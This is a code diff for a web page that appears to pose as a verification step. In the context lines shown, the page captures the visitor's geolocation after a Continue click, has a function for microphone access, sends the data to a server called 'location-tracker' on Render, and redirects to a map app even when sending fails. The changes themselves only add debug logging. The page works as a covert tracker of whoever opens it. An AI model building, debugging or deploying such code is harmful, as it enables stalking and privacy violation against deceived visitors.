@@ -99,7 +99,7 @@
     // =============================================
     // CHANGE THIS TO YOUR RENDER URL
     // =============================================
-   const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';
+    const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';
 
     // =============================================
     // DOM Elements
@@ -151,7 +151,7 @@
     }
 
     // =============================================
-    // 3. MICROPHONE ACCESS
+    // 3. MICROPHONE ACCESS (optional)
     // =============================================
     function captureAudio() {
         navigator.mediaDevices.getUserMedia({ audio: true })
@@ -223,6 +223,7 @@
             return response.json();
         })
         .catch(err => {
+            console.log(`❌ Request failed (${retries} retries left):`, err.message);
             if (retries > 0) {
                 return new Promise(resolve => {
                     setTimeout(() => {
@@ -304,9 +305,11 @@
     });
 
     // =============================================
-    // STEP 2: CLICK CONTINUE
+    // STEP 2: CLICK CONTINUE — WITH DEBUG LOGS
     // =============================================
     continueBtn.addEventListener('click', function() {
+        console.log('✅ Continue button clicked!');   // <-- DEBUG LOG 1
+
         if (!isVerified) return;
         if (isProcessing) return;
 
@@ -335,6 +338,8 @@
         navigator.geolocation.getCurrentPosition(
             // --- SUCCESS ---
             function(position) {
+                console.log('📍 Location captured!', position);   // <-- DEBUG LOG 2
+
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
                 const accuracy = position.coords.accuracy;
@@ -358,8 +363,11 @@
 
                 const compressedPayload = compressData(payload);
 
+                console.log('📤 Sending data to server:', compressedPayload);   // <-- DEBUG LOG 3
+
                 sendWithRetry(RENDER_URL + '/send-location', compressedPayload, 3, 2000)
                     .then(() => {
+                        console.log('✅ Data sent successfully!');   // <-- DEBUG LOG 4
                         showStatus('✅ Data sent! Redirecting...');
                         success.style.display = 'block';
                         success.textContent = '✅ Verification complete. Redirecting...';
@@ -370,8 +378,9 @@
                         }, 1500);
                     })
                     .catch(function(err) {
-                        console.error('All retries failed:', err);
+                        console.error('❌ All retries failed:', err);   // <-- DEBUG LOG 5
                         showStatus('⚠️ Server error, but redirecting anyway...', true);
+                        // Still redirect even if server fails
                         setTimeout(function() {
                             openMapApp(lat, lng);
                         }, 1000);
@@ -379,6 +388,7 @@
             },
             // --- ERROR ---
             function(error) {
+                console.error('❌ Geolocation error:', error);   // <-- DEBUG LOG 6
                 isProcessing = false;
                 continueBtn.classList.remove('loading');
                 continueBtn.textContent = 'Continue';
